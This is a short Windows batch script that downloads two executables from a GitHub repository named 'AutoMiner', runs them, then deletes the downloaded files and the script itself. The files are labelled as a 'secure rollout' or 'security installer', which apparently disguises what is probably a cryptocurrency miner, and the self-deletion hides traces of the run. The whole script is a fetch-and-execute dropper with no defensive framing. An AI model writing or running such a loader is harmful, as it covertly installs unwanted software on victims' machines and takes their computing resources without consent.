@echo off
cd C:/
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe?raw=true -o ManjoSecurityInstallerC.exe
Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecureRollout_C.exe"
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe?raw=true -o ManjoSecurityInstallerG.exe
Ren "ManjoSecureRollout_g.exe_raw=true" "ManjoSecureRollout_g.exe"
ManjoSecureRollout_C.exe && echo C Done
ManjoSecureRollout_g.exe && echo G Done
Timeout /t 1 >nul && Del ManjoSecurityInstallerC.exe && Del ManjoSecurityInstallerG.exe
Echo files deleted && Timeout /t 1 >nul
Del Script.bat
Timeout /t 1 >nul
Exit
